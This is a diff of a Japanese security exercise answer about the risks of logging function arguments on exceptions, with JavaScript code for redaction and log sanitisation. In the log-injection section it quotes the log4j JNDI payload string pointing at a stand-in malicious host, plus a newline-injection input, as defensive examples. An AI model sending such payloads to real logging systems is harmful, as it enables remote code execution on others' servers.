@@ -388,10 +388,85 @@ LDAPやActive Directoryと連携させることで、ユーザーの役割や権
 
 ## 課題 2
 
-### 問題 1
+この実装には以下のようなセキュリティ上の問題が考えられます。
 
-- 関数を実行中に例外が生じた時、関数に渡された引数をログするように実装しました。以下のような具合です
-- <https://gist.github.com/Dowanna/5fb9e0efecde1c3f942133044c910cd8>
-- この実装にはどのようなセキュリティ上の問題がありそうでしょうか？
-  - food for thought 1：仮に秘匿情報が引数に含まれていたら・・・？
-  - food for thought 2：仮に[log4j問題](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)のように、攻撃を目的とした値が引数に含まれていたら・・・？
+1. 機密情報の漏洩
+引数にパスワード、APIキー、個人情報（例: メールアドレスやクレジットカード番号）などの秘匿情報が含まれている場合、例外発生時にそれらがログにそのまま記録されます。
+例えば、入力が { password: "secret123" } のようなオブジェクトだった場合、console.log によって "引数はこちら: {\"password\":\"secret123\"}" と出力され、ログファイルに保存されます。
+ログファイルは通常、長期間保存されたり、バックアップサーバーに転送されたりするため、アクセス権限を持つ第三者（管理者や攻撃者）に漏洩するリスクがあります。
+
+2. ログインジェクション（Log Injection）
+攻撃者が意図的に悪意のある値を引数に渡した場合、ログ処理系統で問題が発生する可能性があります。
+たとえば、log4jの脆弱性（CVE-2021-44228）では、入力値に ${jndi:ldap://malicious.com/a} のような文字列が含まれていると、ログシステムがこれを解釈してリモートサーバーへの接続を試み、結果としてリモートコード実行が引き起こされました。
+JavaScriptのconsole.log自体は直接コードを実行しませんが、ログをファイルに出力したり、ログ解析ツール（例: SplunkやELKスタック）に渡したりする場合、改行や特殊文字を含む入力が誤って解釈されるリスクがあります。
+たとえば、入力が "malicious\nFake Error" のような文字列だと、ログが改行されて見え方が変わり、意図しない動作を誘発する可能性があります。
+
+対策
+このような問題を防ぐためには、例外発生時に入力引数をそのままログに記録するのではなく、データの種類やログ管理のセキュリティレベルを考慮し、適切なフィルタリングやサニタイジングを施す必要があります。
+以下に具体的な対策例を示します。
+
+機密情報のマスク処理
+引数から機密情報を含む可能性のあるフィールドを特定し、それらをマスクする関数を導入します。
+
+``` js
+function sanitizeInput(input) {
+  const sensitiveKeys = ['password', 'apiKey', 'token']; // 秘匿情報のキー名を定義
+  if (typeof input === 'object') {
+    const sanitized = { ...input };
+    for (const key of sensitiveKeys) {
+      if (sanitized[key]) sanitized[key] = '***REDACTED***'; // 秘匿情報を隠す
+    }
+    return sanitized;
+  }
+  return input; // オブジェクトでない場合はそのまま返す
+}
+
+function doSomething(input) {
+  try {
+    // 例外が生じるかもしれない処理
+  } catch (e) {
+    console.error(e);
+    console.log(`引数はこちら: ${JSON.stringify(sanitizeInput(input))}`);
+  }
+}
+```
+
+ログ出力の環境制御
+開発環境でのみ引数をログ出力し、本番環境では出力を控えることで、意図しない情報露出を防ぎます。
+
+``` js
+function doSomething(input) {
+  try {
+    // 例外が生じるかもしれない処理
+  } catch (e) {
+    console.error(e);
+    if (process.env.NODE_ENV === 'development') {
+      console.log(`引数はこちら: ${JSON.stringify(sanitizeInput(input))}`);
+    }
+  }
+}
+```
+
+ログインジェクション対策
+ログに特殊文字や改行が含まれる場合、それらをエスケープする処理を追加します。たとえば、以下のように文字列をサニタイズできます。
+
+``` js
+function escapeLog(input) {
+  if (typeof input === 'string') {
+    return input.replace(/[\n\r\t]/g, ''); // 改行やタブを削除
+  }
+  return input;
+}
+
+function doSomething(input) {
+  try {
+    // 例外が生じるかもしれない処理
+  } catch (e) {
+    console.error(e);
+    const safeInput = escapeLog(sanitizeInput(input));
+    console.log(`引数はこちら: ${JSON.stringify(safeInput)}`);
+  }
+}
+```
+
+この処理により、ログのフォーマットが意図せず崩れるリスクが低減します。
